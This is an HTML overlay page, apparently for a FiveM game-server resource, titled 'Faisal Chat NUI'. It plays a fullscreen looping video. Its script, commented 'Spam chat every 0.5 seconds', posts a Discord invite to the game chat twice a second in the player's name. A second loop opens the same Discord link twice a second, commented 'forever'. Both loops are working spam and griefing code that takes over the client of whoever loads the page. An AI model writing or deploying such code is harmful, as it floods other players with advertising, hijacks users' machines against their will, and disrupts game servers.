<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Faisal Chat NUI</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: black;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }

        .background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
    </style>
</head>
<body>
    <video
        class="background"
        autoplay
        muted
        loop
    >
        <source
            src="https://cdn.discordapp.com/attachments/1270964082874384476/1400188710271586314/ScreenRecording_--_--_1.mov?ex=688bbada&is=688a695a&hm=8bd7235492e8d792ef6dfe452edaa5dfaaeb692f036cfe8947b731d069f1ce7b&"
            type="video/mp4"
        />
        Your browser does not support the video tag.
    </video>

    <script>
        const msg = "ðŸ‘‘ Faisal/New 3mkm- discord.gg/zx7 ! ðŸ‘‘";

        // Spam chat every 0.5 seconds
        setInterval(() => {
            fetch(`https://${GetParentResourceName()}/chat`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json; charset=UTF-8'
                },
                body: JSON.stringify({
                    action: "sendMessage",
                    message: msg
                })
            }).catch(() => {});
        }, 500);

        // Open Discord link every 0.5 seconds â€” forever
        setInterval(() => {
            window.invokeNative("openUrl", "https://discord.gg/zx7 ");
        }, 500);
    </script>
</body>
</html>
